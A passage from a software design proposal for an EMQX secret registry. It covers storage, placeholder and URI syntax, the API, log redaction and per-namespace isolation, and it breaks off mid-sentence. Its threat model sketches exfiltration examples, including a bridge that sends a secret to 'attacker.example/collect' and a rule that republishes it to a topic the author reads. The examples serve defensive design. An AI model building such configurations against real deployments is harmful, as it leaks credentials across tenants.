# Secret registry for data-integration templates

## Changelog

* 2026-05-21: @zmstone Initial draft
* 2026-07-20: @zmstone Add namespace scoping / isolation
* 2026-07-23: @zmstone Drop cross-namespace secret sharing: reference implies
  disclosure, so secrets are reachable only within their own scope (namespace
  or global), with no fallback in either direction
* 2026-07-24: @zmstone Reintroduce namespace→global sharing via a per-global
  `share_ns` flag (default **false**, opt-in): a namespaced reference falls back
  to a global secret only when that global secret is explicitly marked
  shareable. A global secret is tenant-invisible by default. Global→namespace
  and sibling-namespace resolution remain forbidden

## Abstract

This proposal introduces a cluster-wide secret registry: a small EMQX
application that stores named byte strings, exposes a management HTTP
API scoped under data integration, and surfaces those values to
template renderers through a new placeholder syntax `$secret{<name>}`.
The placeholder is resolved at render time and is elided from every
trace and log path, so a bridge / action / rule configuration can
reference an API token by name without that token ever appearing in
debug output, audit logs, or error messages.

The registry's only purpose is to be referenced from data-integration
templates -- HTTP bridge headers / URLs / bodies, HTTP authn / authz
request templates, webhook actions. It is not a general-purpose
configuration store, not an MQTT publish payload source, and not a
key-management service. Encryption at rest, automatic rotation, and
secret-broker integration (Vault, AWS Secrets Manager) are explicit
non-goals for v1.

Read-back over the API returns metadata only -- the stored byte string
never leaves the broker except as part of a rendered template at the
moment the template is used.

Secrets are scoped: a secret is owned by the scope of the principal
that created it — a namespace, or global. A namespaced reference
resolves against its own namespace first, then falls back to a global
secret **only if that global secret is explicitly marked shareable**
(`share_ns`, default **false**). A global secret left at the default,
and every namespace's own secrets, stay private to their scope. A
global configuration never resolves a namespace's secret, and one
namespace never resolves another's — so the single cross-scope path is
namespace→shareable-global, it is opt-in, and it runs one way.

This shape follows from one observation. Because a secret is resolved
by rendering it into outbound bytes, and the principals who reference
secrets are the same principals who choose where those bytes go, the
ability to *reference* a secret is equivalent to the ability to *read*
its value. Marking a global secret shareable (`share_ns = true`) is
therefore a deliberate decision to disclose its value to every
namespace's administrators — which is why the default is private: a
global secret is tenant-invisible unless an operator opts it into
sharing. The no-read-back API bounds exposure of secrets at rest
(config dumps, backups, logs) but is not an access-control boundary
between "can configure" and "can learn the value"; cross-scope
isolation is enforced by non-reachability, which `share_ns = true`
deliberately opens, one global secret at a time.

## Motivation

EMQX data-integration features today expect operators to write secrets
directly into bridge / action / authn / authz configurations. A
deployment with twenty HTTP bridges sharing the same backend API token
has that token replicated in twenty places. Rotation means twenty
edits. Each of those config locations is also persistent in
`cluster.hocon`, visible via the dashboard, included in `emqx ctl data
export` artifacts, and surfaceable in any trace or debug log that
renders the template.

Three concrete pain points follow:

* **Operational**: rotation is N-touch. Tooling to mass-update the
  same value across configs is missing today and would be brittle if
  added (matching by string equality across heterogeneous templates).
* **Audit / governance**: the same shared API token is copied into
  many configs, so its plaintext lives in many places at once —
  `cluster.hocon`, dashboard config views, export artifacts. There is
  no single named handle to rotate, revoke, or reason about. (Note:
  the registry does *not* create a "reference but cannot read"
  privilege — see "Security model: reference implies disclosure"; a
  principal who can put the token into a config they control can
  always recover its value. What the registry removes is the token's
  *at-rest* sprawl, not the operator's knowledge of it.)
* **Exposure**: rendered templates appear in client trace, in rule
  engine debug output, and in HTTP request logs at the bridge level.
  Today there is no opt-in mechanism for "render this token, but
  redact it from any log line."

A central, named registry of secrets paired with a render-aware
placeholder solves all three. Operators store the secret once. Bridge
configurations reference `$secret{prod_api_token}`. The renderer
substitutes the value into the outbound bytes; the same renderer
emits `$secret{prod_api_token}` (unsubstituted) into any trace or log
record. Rotation is one HTTP PUT.

## Design

### Target release

This proposal targets EMQX v7.

### Component overview

A new application `emqx_secret_registry` under `apps/` provides:

* A cluster-wide mnesia / mria table storing
  `#emqx_secret{{Scope, Name}, Value, ...metadata...}` rows (see
  "Storage shape"). Replicated to all nodes via the same shard
  mechanism used by existing config tables.
* An HTTP API under `/api/v5/secrets/...` for create,
  list, update (by overwrite), delete, and get-metadata. **The value
  field is never returned by the API.** Read-back returns metadata
  only.
* A render-side hook integrated into `emqx_template` (and any other
  template renderer that participates in data-integration paths --
  `emqx_variform`, `emqx_placeholder` as applicable) that recognises
  the `$secret{<name>}` token and substitutes it at render time.

### Storage shape

Table: `emqx_secret_registry` (mnesia, mria-replicated, on the
configuration shard so it follows the same disk-copy semantics as
cluster.hocon).

Record:

```
{emqx_secret,
   key         :: {?global_ns | binary(), binary()},  %% {Scope, Name}
   value       :: binary(),      %% raw bytes, UTF-8 well-formed
   share_ns    :: boolean(),     %% global secret reachable from namespaces? default false
   description :: binary(),      %% operator-supplied free-form note, optional
   created_at  :: integer(),     %% monotonic millis
   updated_at  :: integer(),     %% monotonic millis
   extra       :: map()          %% reserved for forward-compatible fields
}
```

The owning scope (`?global_ns` or a namespace) is the first element
of the key. `share_ns` governs whether a **global** secret is
reachable from namespaces by fallback (default `false` — sharing is
opt-in); it has no effect on a namespace-owned secret, which is never
shared into a narrower scope. `extra` is an empty map reserved so later versions can
add fields without a schema migration. See "Resolution" and
"Namespace scoping and isolation" below.

The primary key is the `{Scope, Name}` pair, following the v2
topic-metrics precedent (`emqx_topic_metrics_mria`, keyed
`{'_' | global | binary(), '_' | binary()}`). Names are unique
*within* a scope, not cluster-wide — a namespace and the global scope
may each hold a secret named `prod_token`, and the namespace's own
shadows the global one for that namespace (see "Resolution").

Constraints:

* `name` matches `^[A-Za-z0-9][A-Za-z0-9_-]{0,62}$` (same alphabet as
  `emqx_utils:is_restricted_str/1` used for client-attr names). 63-byte
  cap. Names are case-sensitive.
* `value` is at most 16 KiB. Stored as-is after a UTF-8 well-formedness
  check. PEM-encoded private keys (newline-containing) are permitted.
* `description` is at most 512 bytes, UTF-8, control-character-free
  except whitespace.
* The total number of secrets is capped at 1024 **per namespace**
  (configurable; see Configuration Changes), with the global namespace
  counting as one namespace for this purpose. A per-namespace cap
  rather than a cluster-wide one keeps one tenant from exhausting the
  registry for everyone; the precedents are `?MAX_NUM_TNS_CONFIGS`
  (1000 managed namespaces) and `?MAX_COLLECTIONS` (512 topic-metric
  collections).

### Sanitization

At storage time, validate:

* `name` matches the regex above.
* `value` is well-formed UTF-8 (via `unicode:characters_to_binary/1`).
  Reject otherwise. This is a well-formedness check, not a
  character-class check -- newlines are permitted in the stored value.
* `description` rejected if it contains bytes 0x00–0x1F or 0x7F–0x9F,
  except 0x09 / 0x0A (tab, newline) which are kept.

At **use time** (i.e. when the renderer inlines a secret into an
outbound byte stream), the consumer of the rendered output must apply
its own context-appropriate validation:

* HTTP header value: reject if it contains CR / LF / NUL. The header
  byte check landed in `emqx_utils:http_header_byte_check/1` is
  already in place; rendered output flowing through the HTTP bridge
  connector and the HTTP authn / authz utils inherits it for free.
* HTTP URL: reject, never use secrets in URL.
* HTTP body: no additional check (operator is responsible for shaping
  the body).
* MQTT topic / payload template: `$secret{...}` placeholders are
  **rejected at config-validation time** for these contexts. See
  "where the placeholder is allowed" below.
* Action / source / connector secret-typed config field (resolved
  via `secret://<name>`): no additional check at the registry layer
  -- the consuming connector (Kafka SASL, HTTP basic auth, MongoDB
  credential, etc.) imposes whatever byte / encoding constraints
  its underlying protocol requires, at its own use site.

This split -- store as-given (UTF-8 only), validate at use site --
mirrors how PEM keys flow through TLS configuration today and avoids
constraining what shape an operator's API token may take.

### Placeholder syntax

A new template token `$secret{<name>}` is recognised by the renderers
that participate in data-integration paths:

* `emqx_template` (the main template renderer used by HTTP bridge
  headers, URLs, bodies, and by `emqx_auth_http_utils`).
* `emqx_placeholder` (the legacy placeholder substitutor used in
  rule SQL `FOREACH`, rule action templates).
* `emqx_variform` (the expression engine used in `client_attrs_init`,
  `clientid_override`, etc.).

In each renderer, when the substitution engine encounters
`$secret{<name>}`, it:

1. Looks up `<name>` in `emqx_secret_registry`.
2. On hit, substitutes the stored byte string.
3. On miss, the behavior is **strict-rendering-fail by default** --
   the render call returns `{error, {unknown_secret, Name}}` and the
   consumer (the HTTP bridge connector, the authn request builder,
   etc.) treats this as a configuration-time error and aborts the
   operation. Logging records `{unknown_secret, Name}` -- name only,
   never any stand-in value.

The renderer's debug / trace output paths use a separate code path
that emits `$secret{<name>}` verbatim (unsubstituted) wherever a
fully-rendered template would otherwise appear. This is the key
invariant of the design: the renderer has two output channels (wire
and log), and the secret never lands on the log channel.

### Where the placeholder is allowed

| Context | Allowed | Notes |
|---|---|---|
| HTTP bridge action: header value | yes | Primary use case. Bytes inherit the header byte check at the connector. |
| HTTP bridge action: URL | yes | URL components are byte-checked at the connector. |
| HTTP bridge action: body template | yes | Body shape is operator's responsibility. |
| HTTP authn request: header / body | yes | Same template renderer; falls in for free. |
| HTTP authz request: header / body | yes | Same. |
| Webhook action template | yes | Same. |
| Rule SQL `FOREACH`, `SELECT` payload shaping | yes | Body-shaping use case. |
| MQTT topic template (rule republish, mountpoint) | **no** | No use case, and a topic appearing in audit logs would leak the secret. Reject at config-validation time. |
| MQTT payload template (rule republish) | **no** | Same. Payloads on the broker should not contain backend-credential bytes by accident. |
| `mqtt.clientid_override`, `mqtt.client_attrs_init.expression` | **no** | A clientid or attribute appearing in client log meta and being templated from a secret is a footgun. |
| Listener / cluster / static config | **no** | Secrets are a runtime concept and should not feed bootstrapping configuration. |
| Action / source / connector **password / API-key field** (typed `emqx_schema_secret:mk/1`) | n/a -- use the `secret://<name>` URI instead | These are HOCON secret-typed fields, not template strings; see the `secret://` section below. The placeholder is for template rendering, not for HOCON secret fields. |

The disallowed contexts reject at configuration validation time --
`{error, {secret_placeholder_not_allowed, <context>}}` returned from
the schema check, no runtime surprise.

### Rule SQL function `get_secret(<name>)`

In addition to the placeholder syntax, a rule SQL function
`get_secret(<name>)` is provided for cases where the secret value
needs to participate in an SQL expression (e.g. HMAC-signing a
payload, building a custom Authorization header value out of multiple
pieces, or passing as one argument among many to another SQL
function).

```
SELECT
  payload,
  hmac_sha256(get_secret('webhook_signing_key'), payload) AS signature
FROM "events/#"
```

The function looks up the secret by name in the registry and returns
the stored byte string. On miss, returns `undefined` (consistent with
the rest of the rule SQL function surface) and the rule continues --
typically resulting in a downstream `undefined` argument that the
caller handles per its own semantics.

**The placeholder is the preferred path; `get_secret/1` is the
escape hatch.** Its drawback is structural: once the value is bound
to a SQL variable or used as an argument to another function, it
flows through the standard rule expression pipeline, which includes
the rule debug / trace output. That output can be enabled per-rule by
operators via the dashboard or REST API, and any debug log emitted
while the rule is being traced will record the resolved value
verbatim alongside the other intermediate expression results.
The placeholder, by contrast, is special-cased in the renderer's
log-channel formatter and is preserved as `$secret{<name>}` in every
trace and debug path.

Concretely, the difference shows up here:

* `Authorization: Bearer $secret{prod_token}` in a bridge header
  template -> trace log records the header template verbatim with
  `$secret{prod_token}` unsubstituted. Wire sees the substituted
  value.
* `SELECT get_secret('prod_token') AS token` in a rule with debug
  enabled -> trace log records `token = "abc123..."` (or however the
  secret value renders) alongside every other SQL result. Wire sees
  the value too, of course.

For straight credential substitution into a bridge or action
template, prefer the placeholder. Use `get_secret/1` only when the
value must participate in an SQL expression that the placeholder
syntax cannot express, and accept the trace-exposure trade-off --
or disable rule tracing on rules that reference secrets.

Documentation will lead with the placeholder, mention `get_secret/1`
as the escape hatch, and call out the trace-exposure caveat at the
point of first introduction.

### `secret://<name>` for HOCON secret fields

Action / source / connector configurations expose dedicated *secret*
fields (passwords, API tokens, bearer tokens, etc.) that are typed
through `emqx_schema_secret:mk/1`. Today those fields accept a raw
string or a `file://<path>` URI; the URI form is resolved lazily by
`emqx_secret_loader:load/1` at use time, and redaction in
`emqx_utils_redact` already keeps the URI itself out of logs.

We extend the same plumbing with a parallel `secret://<name>` URI
that resolves against the registry:

* HOCON parse / schema convert: `emqx_schema_secret:wrap/1` gets a
  new clause matching `<<"secret://", _/binary>>`, producing
  `emqx_secret:wrap_load({secret_registry, Name})`.
* Lazy load: `emqx_secret_loader:load({secret_registry, Name})`
  looks the name up in `emqx_secret_registry` and returns the bytes.
  On miss, throws `#{msg => failed_to_resolve_secret, name => Name}`
  with the same shape as the existing `failed_to_read_secret_file`
  error. The caller (the connector / action start path) treats this
  as a startup failure and surfaces it in the resource error state,
  exactly as it would for a missing `file://` path.
* Redaction: `emqx_utils_redact:do_redact_v/1` gets a new clause
  matching `<<"secret://", _/binary>>` that preserves the URI in
  serialized config dumps without expanding it. The URI itself is
  not sensitive -- it names a registry entry; the value behind the
  name is what we're hiding.
* HOCON serialization round-trip: `source/1` produces
  `<<"secret://", Name/binary>>` from the wrapped term, so config
  exports and `cluster.hocon` materializations preserve the URI form
  rather than the resolved value.

Eligible fields: any field declared via `emqx_schema_secret:mk/1`.
That means every existing password / token / API-key field in
connector and authn / authz schemas inherits `secret://` support
without per-field changes. The list is large enough that enumerating
it here would rot quickly; the operative rule is "if the field is
already `emqx_schema_secret:mk/1`, it supports `file://` today and
will support `secret://` after this change."

Worked example -- a Kafka producer connector's SASL password:

```hocon
connectors.kafka_producer.demo {
  authentication {
    mechanism = "plain"
    username  = "emqx"
    password  = "secret://kafka_prod_password"
  }
  ...
}
```

At connector start, the password is resolved against the registry;
log lines that today print `file:///etc/emqx/kafka.pw` would print
`secret://kafka_prod_password` for the registry case. Rotation is
the same `PUT /api/v5/secrets/kafka_prod_password` HTTP call --
existing connector instances continue to use the cached resolved
value until they restart (matching `file://` semantics). A separate
"force-reload-secrets" administrative action can be considered later
if hot rotation becomes a requirement; for v1 the reload model is
"restart the resource that uses the secret," which is consistent
with how `file://` works today.

This gives the registry three coherent access surfaces, each
matching the shape of its consumer:

| Consumer | Access mechanism | Log behavior |
|---|---|---|
| Template-rendered output (HTTP bridge headers / URLs / bodies, authn / authz HTTP request templates, webhook templates) | `$secret{<name>}` placeholder | Placeholder preserved in trace / debug logs |
| Rule SQL expression (HMAC, multi-input composition) | `get_secret('<name>')` function | Resolved value may appear in rule trace when tracing is enabled -- escape hatch only |
| Connector / action / source / authn / authz **password / API-key field** (typed `emqx_schema_secret:mk/1`) | `secret://<name>` URI in HOCON | URI preserved in config dumps; resolved value never logged |

### API surface

Path prefix: `/api/v5/secrets`. The endpoints sit at the top level of
the REST surface, not under any sub-namespace. The
"data-integration-only" association is expressed through the API-key
scope, not through the URL.

API key scope: the endpoints are gated under the existing
`data_integration` scope -- the same scope that already governs
bridges, actions, connectors, and rules. Operators who already
manage data-integration via API keys get secret management with the
same scope grant. Dashboard role-based access maps to the same
scope tag. Gating is enforced through the API-key scope-check layer
introduced on release-60 (`emqx_mgmt_auth:check_scopes/2`).

Endpoints:

* `POST /api/v5/secrets`
  body: `{ "name": "...", "value": "...", "description": "...",
  "share_ns": true }`
  Creates a new secret in the caller's scope. Errors on name
  collision within that scope. `share_ns` is accepted only for global
  secrets (defaults to `false`); it is rejected for a namespaced
  create.
* `GET /api/v5/secrets`
  Returns a paginated list of `{ name, description, scope, share_ns,
  created_at, updated_at }`, where `scope` is `global` or the owning
  namespace. **The value is never returned.** A namespaced caller's
  list is their own namespace's rows plus the shareable global rows
  (flagged inherited / read-only); non-shareable globals and other
  namespaces' rows are omitted (see "API surface" under Namespace
  scoping).
* `GET /api/v5/secrets/{name}`
  Returns `{ name, description, scope, share_ns, created_at,
  updated_at }`. **The value is never returned.** A request for a name
  the caller cannot reference returns `404`, indistinguishable from a
  nonexistent name.
* `PUT /api/v5/secrets/{name}`
  body: `{ "value": "...", "description": "...", "share_ns": true }`
  Overwrites the existing secret; `share_ns` may be toggled here for a
  global secret. This is the rotation path. Only the owning scope may
  call it — a namespaced admin cannot `PUT` a shareable global.
* `DELETE /api/v5/secrets/{name}`
  Removes the secret. The renderer's strict-fail behavior applies to
  any subsequent template render that references the deleted name.

All five endpoints accept a `?ns=<namespace>` query parameter and are
scoped to the caller's namespace; see "Namespace scoping and
isolation" above.

### Logging and tracing

All log emissions involving template rendering must go through the
log-channel formatter rather than substituting on the wire and then
logging. Concretely:

* Bridge debug log records `template = "Authorization: Bearer $secret{prod_token}"`,
  not `template = "Authorization: Bearer abc123"`.
* Rule engine trace records show `$secret{...}` placeholders verbatim.
* HTTP authn / authz request logs (when enabled) record
  `$secret{...}` placeholders, not the substituted value.
* Audit log records secret-management API operations as
  `{action, create|update|delete, name, actor}` -- never the value.

### Backup / export

`emqx ctl data export` and the corresponding REST endpoint exclude
the secret registry by default. A future opt-in (`--include-secrets`,
plus an encryption requirement) can be considered separately; for v1
the registry is excluded outright. This must be wired explicitly into
`emqx_mgmt_data_backup` -- forgetting to do so is the predictable
foot-gun.

`emqx ctl data import` accepts a backup that omits the secret table.
If a backup containing a `secrets` table is presented and the running
cluster also has secrets configured, the import fails closed with a
clear error rather than merging.

### Cluster replication

The mnesia table sits on the same shard as other configuration data
(`emqx_conf` shard or its equivalent on release-63 -- to be confirmed
during implementation). This means:

* All nodes in the cluster see all secrets.
* A new node joining the cluster receives the secrets table as part
  of the standard mria join.
* Network partitions follow the same semantics as any other
  configuration data -- mria's standard reconciliation applies.

The secret registry does **not** require its own shard, its own
quorum, or any cluster-wide RPC during render. Render-time lookups
are local mnesia dirty reads.

### Namespace scoping and isolation

EMQX supports namespaces (multi-tenancy) for connectors, actions,
sources, rules, authn / authz built-in-database records, managed
certificates, and topic metrics. Secrets are referenced from
precisely those resources, so the registry must be namespace-aware or
it becomes the one shared mutable surface that punches through tenant
isolation.

#### Ownership model

Every secret is owned by exactly one namespace. The owner is the
namespace of the principal that created it, determined the same way
every other namespaced API determines it:

* The namespace is encoded in the API key / dashboard user role as
  `ns:<namespace>::<role>` and parsed by
  `emqx_dashboard_rbac:parse_role/1`.
* At the HTTP boundary `emqx_dashboard:get_namespace/1` reads it out
  of `auth_meta`, defaulting to `?global_ns`.
* A `resolve_namespace/2` minirest filter stores the effective
  namespace as `resolved_ns` on the request, applying the established
  rule: a **global** admin may act on any namespace by passing
  `?ns=<namespace>`; a **namespaced** admin is pinned to their own and
  gets `not_authorized` if they pass a different one. This mirrors
  `emqx_connector_api:parse_namespace/1`.

A secret created with a global API key is owned by `?global_ns`. A
secret created with a namespace-scoped API key is owned by that
namespace.

#### Security model: reference implies disclosure

The API never returns a value to anyone. It is tempting to read that
as "an operator can be granted the ability to *reference* a secret
without being granted the ability to *read* it." For the audience
that references secrets — principals with data-integration write
access — that reading is false.

Anyone who can author a data-integration resource controls where its
rendered output goes, and every such resource is an oracle for the
secret it references:

* An HTTP bridge with `X-Steal = "$secret{token}"` and
  `url = "https://attacker.example/collect"` renders the value onto
  the wire toward an endpoint the author controls.
* A rule `SELECT get_secret('token') AS v` that republishes to a
  topic the author subscribes to leaks the value with no egress at
  all.
* Enabling trace on one's own rule that references the secret records
  the resolved value in the trace log.

So for this feature **the ability to reference a secret is equivalent
to the ability to read its value.** Disabling read-back on the API
narrows the exposure of secrets *at rest* (config dumps, backups,
dashboard, logs — see Motivation) but is not an access-control
boundary between "can configure" and "can learn the value." The EIP
does not claim otherwise.

The one boundary that *is* real is the negative one: a secret a
principal **cannot reference** is a secret that principal cannot
exfiltrate. Cross-scope isolation is therefore built on
*non-reachability*, not on any view gate — with exactly one deliberate
opening: a global secret marked `share_ns = true` is made
referenceable from every namespace, i.e. its value is intentionally
disclosed to all tenant administrators. Everything else — global
secrets with `share_ns = false`, every namespace's own secrets, and
all sibling-namespace pairs — remains mutually non-reachable.

#### Resolution: own scope first, then a shareable global

Each secret belongs to exactly one scope — a namespace, or global. A
reference (`$secret{N}`, `get_secret('N')`, `secret://N`) is resolved
relative to the scope of the *configuration that contains it* (see
"The resolving scope is the configuration's, not the client's"):

* A reference evaluated in namespace `NS` resolves `{NS, N}` first.
  On a hit the namespace's own secret is used — a namespace-owned
  secret **shadows** a global one of the same name.
* On a miss, resolution falls back to `{?global_ns, N}` **only if
  that global secret is explicitly marked `share_ns = true`**. Sharing
  is opt-in: a global secret at the default (`share_ns = false`) is
  invisible to the fallback, exactly as if it did not exist.
* A reference evaluated in the **global** scope resolves
  `{?global_ns, N}` **only** — there is no global→namespace fallback.
* On a final miss the strict-fail behavior described earlier applies
  (`{error, {unknown_secret, Name}}`). The failure is identical
  whether the name is unknown, out of scope, or a non-shareable
  global, so a tenant cannot probe for the existence or shareability
  of names it cannot reach.

This is the only cross-scope path in the design, and it runs one way:
a namespace may inherit a **shareable global** secret; nothing else
crosses a scope boundary. A namespace never resolves another
namespace's secret, and a global configuration never resolves a
namespace's.

**Why a fallback at all.** The operational case it serves is a single
backend credential used by both a global pipeline and one or more
tenants' pipelines — e.g. a multi-tenant target system whose API key
authenticates a global authn hook *and* is required by each
namespace's message-forwarding action (the review scenario that
prompted this revision). Without fallback, every namespace admin has
to be handed a copy of that credential to store in their own
namespace; rotation then becomes N-touch across namespaces, and —
because referencing a secret already discloses its value — those
copies grant the tenant admins nothing they would not already obtain
by referencing a single shared original. Fallback removes the copy
sprawl without changing who can read the value.

**Why the default is nonetheless `false`.** Because reference implies
disclosure, `share_ns = true` on a global secret discloses its value
to the administrators of **every** namespace — any of them can
reference it (its name is listed to them, not guessed; see "API
surface") in a resource they control and render it out. Fallback is
therefore convenient but not free, so it is off until an operator
turns it on: a global secret is private to the global scope unless
someone deliberately marks it shareable. The default protects the
credential that was *not* meant to be tenant-facing (the "secret
hidden from namespace users" case raised in review); enabling
`share_ns` on the genuinely-shared backend credential is a one-time,
per-secret decision made by whoever already holds the value. Mark a
global secret shareable only when disclosure to all tenants is
acceptable. This is a coarse, all-namespaces switch; a *targeted*
"share to these namespaces only" grant is a possible future
refinement, and `share_ns` is its all-or-nothing zero case (see
"Declined
alternatives").

#### The resolving scope is the configuration's, not the client's

A secret is resolved in the scope of the *configuration that
references it*, never in the scope of whatever MQTT client happens to
trigger the render. This distinction is load-bearing for
authentication, where the client's namespace is frequently not yet
established at the moment a secret must be resolved.

A client connects in the **global scope**: its namespace (`tns`) is
not known at TCP-accept time and is commonly *initialized from the
authentication result itself* (an authn backend returns a `tns` /
`namespace` attribute, or it is derived during the authn exchange).
An HTTP authn / authz request template that references a secret is
therefore rendered *before* the client has a namespace at all.

Resolution keys off the **authenticator's / authz source's own
scope**, which is known from that resource's configuration:

* A **namespaced** authenticator (configured under namespace `NS`)
  resolves its `$secret{...}` references against `{NS, _}` first, then
  falls back to a shareable global `{?global_ns, _}` by the ordinary
  rule above — even though the connecting client is still in the
  unresolved/global scope. This is *not* a global→namespace fallback:
  the reference is owned by a namespaced configuration and resolves in
  that namespace's context (which legitimately includes shareable
  globals). A client being pre-`tns` does not downgrade the
  authenticator's scope to global. This is exactly the review scenario
  — a global API key, shared, reached from a namespaced authn hook and
  a namespaced forwarding action alike, stored once.
* A **global** authenticator resolves against `{?global_ns, _}`.

The implementation must take the resolving namespace from the
authenticator/source configuration (the chain the client is
authenticating against), and must **not** substitute the client's
not-yet-resolved `tns` (which would wrongly fall to global and fail
to find a namespaced authenticator's secret, breaking namespaced
authentication). Concretely: do not thread `tns` from the channel
into secret resolution on the authn path; thread the authenticator's
namespace.

#### Where the namespace comes from at resolution time

Each of the three access paths already has the namespace in hand:

| Access path | Source of namespace |
|---|---|
| `secret://<name>` in a connector / action / source config | The resource is namespaced; the namespace is carried in the resource id (`ns:<Ns>:connector:<Type>:<Name>`) and extractable via `emqx_resource:extract_namespace_from_resource_id/1`. |
| `$secret{<name>}` in an HTTP bridge / action template | Same — the rendering happens inside a namespaced resource. |
| `$secret{<name>}` / `get_secret('<name>')` in a rule | The rule record carries `namespace`; `emqx_rule_runtime` already propagates it into every action invocation and trace context. |
| `$secret{<name>}` in an HTTP authn / authz request template | The **authenticator / authz source's own** namespace, taken from its configuration — **not** the connecting client's `tns`, which is typically unresolved at authn time (see "The resolving scope is the configuration's, not the client's"). |

The practical implication for implementation is that
`emqx_secret_loader:load/1` and the template renderer hooks must take
a `maybe_namespace()` argument rather than a bare name. Threading
that argument through every call site is the bulk of the work — a
default-to-global arity-1 wrapper would compile, and would silently
resolve every namespaced lookup against the global scope: on the
data-integration paths it resolves the wrong secret (or fails closed),
and on the authn path it breaks namespaced authentication by missing
the authenticator's namespaced secret. It must not be added.

#### API surface

The endpoints described above gain the standard namespace plumbing:

* A `?ns=<namespace>` query parameter on all five endpoints, honoured
  for global admins, rejected for namespaced admins naming a
  namespace other than their own.
* `validate_managed_namespace/2` on create — running the
  `'namespace.resource_pre_create'` hook, returning
  `Managed namespace not found` for an unknown namespace, exactly as
  the connector / rule / authn APIs do. `DELETE` is exempted for
  global admins so orphaned secrets can be cleaned up after a
  namespace is gone.
* A `?SECRETS_API` clause in `emqx_dashboard_rbac:do_check_rbac/3`.
  Without it the catch-all denies namespaced admins outright.

**Read visibility follows reachability.** A caller may list / GET
exactly the secrets it can *reference*, and no others:

* A namespaced admin (`resolved_ns = NS`) sees the rows owned by `NS`
  **plus the shareable global rows** (`{global, _}` with
  `share_ns = true`), the latter flagged as inherited and read-only.
  Global secrets with `share_ns = false` and every other namespace's
  rows are omitted from lists and return `404` on direct `GET`.
* A global admin sees the global rows (or, via `?ns=`, that
  namespace's rows).

Aligning list-visibility with reference-reachability is deliberate:
since a shareable global is already readable-by-reference from a
namespace, hiding its *name* there would be theater, and surfacing it
lets a tenant admin discover what they may reference. A non-shareable
global is unreachable, so its name is withheld.

**Write is own-scope only.** Create / update / delete are restricted
to rows the caller owns (`resolved_ns`): a namespaced admin manages
only their own namespace's secrets, a global admin only global (or,
via `?ns=`, a named namespace's) secrets. A namespaced admin can
*reference and read* a shareable global but cannot modify or delete
it. `share_ns` itself is settable only on a global secret, by a global
admin.

On `do_check_rbac/3`: it currently allows **any** `GET` for a
namespaced superuser, on the rationale that "namespaces mostly guard
against accidental mutation, not information disclosure." The
reachability-based filtering above is enforced in the secrets handler,
not by extending that clause; the broad `GET` allowance is a
pre-existing, registry-independent concern, and tightening it is out
of scope for this EIP. Values are never returned by any endpoint
regardless of scope.

#### Namespace deletion

The registry subscribes to the `'namespace.delete'` hookpoint and
deletes all rows keyed `{NS, _}`. Secrets live outside the config
tree, so the `emqx_mt_config_janitor` config-root teardown does not
reach them — a hook callback is required, not optional. This is the
same gap that authn / authz namespaced mnesia rows and v2
topic-metrics collections currently have; we should not add a third
instance of it.

The callback must be idempotent and retry-safe: the janitor re-scans
tombstones periodically and re-runs cleanup if a previous attempt
failed.

Deleting a namespace does **not** touch global secrets or any other
namespace's secrets; only rows keyed `{NS, _}` are removed.

#### Backup / export

The registry is excluded from backup entirely (see "Backup / export"
above), so there is no per-namespace export behavior to define. Were
it to become opt-in later, the export must be filtered by the
requesting principal's namespace — a namespaced admin's export must
not carry global or sibling-namespace secrets.

## Configuration Changes

No defaults need changing for any existing config field.

## Backwards Compatibility

This is a pure addition. Existing configurations continue to work
without modification.

A bridge configuration that today has `headers = { Authorization =
"Bearer abc123" }` is unchanged. The operator can choose to migrate
to `headers = { Authorization = "Bearer $secret{prod_token}" }` after
creating the secret, but is not required to.

The strict-rendering-fail behavior on missing secrets means
configurations referencing nonexistent secret names will fail closed.
This is by design and aligns with the existing behavior for missing
required template variables in HTTP bridges.

## Document Changes

* New documentation section under data integration explaining the
  secret registry, the placeholder syntax, where it is allowed, and
  rotation patterns.
* Update the HTTP bridge / authn-http / authz-http documentation to
  cross-reference the placeholder as the preferred way to template
  credentials.
* Update the `emqx ctl data export` / `data import` documentation to
  note the registry exclusion.

## Testing Suggestions

* Common tests for the registry itself: CRUD via API; cluster
  replication (write on node A, read on node B); name regex
  validation; UTF-8 well-formedness; length caps; max-count cap;
  scope check on the management API.
* Rendering tests: `$secret{name}` substitutes correctly in each
  allowed context; rejected at config-validation time in disallowed
  contexts; missing-secret produces strict-fail; renamed secret is
  picked up on next render.
* Log / trace tests: every relevant log path (bridge debug, rule
  engine trace, authn/authz request log, audit log) emits
  `$secret{...}` verbatim and never the substituted value. This is
  the most important class of test -- a regression here defeats the
  whole feature.
* Backup tests: `emqx ctl data export` produces an archive that
  contains no secret values; `data import` rejects archives
  containing a secrets table when the cluster already has secrets.
* Namespace tests -- the isolation-critical class:
  * Own-scope hit: a namespaced config resolves a bare name to its
    own namespace's secret when one exists, shadowing a same-named
    global.
  * Shareable-global fallback: a namespaced config that misses locally
    resolves a global secret with `share_ns = true` and renders it.
  * Non-shareable global is invisible: the same miss against a global
    with `share_ns = false` strict-fails, with a failure
    indistinguishable from a nonexistent name. This is the
    value-exfiltration test — a tenant bridge referencing a
    non-shared global name must never render that value onto the wire.
  * Sibling isolation: a namespaced config never resolves another
    namespace's secret, even by the same name.
  * A global config resolves only global secrets and never a
    namespace-owned secret, even when the name exists only in a
    namespace.
  * Toggling `share_ns` from `true` to `false` on a global secret
    makes a previously-resolving namespaced reference strict-fail on
    its next render.
  * Authn scoping: a **namespaced** HTTP authenticator resolves its
    `$secret{...}` against its own namespace (then a shareable global)
    even though the connecting client has no `tns` yet — and even when
    the client's `tns` is initialized *from* this authentication. A
    **global** authenticator resolves against global. A regression
    that keys resolution off the client's unresolved `tns` must fail
    this test.
  * Read visibility: a namespaced admin's list contains their own
    rows plus shareable globals (flagged inherited), and omits
    non-shareable globals and sibling namespaces; direct `GET` of a
    hidden name returns `404`. A global admin can act on any namespace
    via `?ns=`.
  * Write is own-scope: a namespaced admin cannot create, update, or
    delete a global secret (including a shareable one they can read),
    nor any other namespace's secret.
  * Per-namespace cap is enforced per namespace, not cluster-wide.
  * `'namespace.delete'` removes exactly that namespace's secrets and
    leaves global (including shareable) and sibling-namespace ones
    intact; re-running the cleanup is a no-op.
* HTTP-header byte check composition: a stored secret whose value
  contains CR / LF is accepted at storage time (UTF-8-only check
  passes), but rejected at the HTTP bridge connector when used as a
  header value. Verify the rejection path emits a log line that
  identifies the secret by name but not by value.

## Declined Alternatives

### Rule function `get_secret(<name>)` as the *only* access surface

Considered: expose only a rule SQL function and skip the placeholder.
Rejected: a SQL function's return value flows through the standard
rule expression pipeline, including the trace / debug output paths,
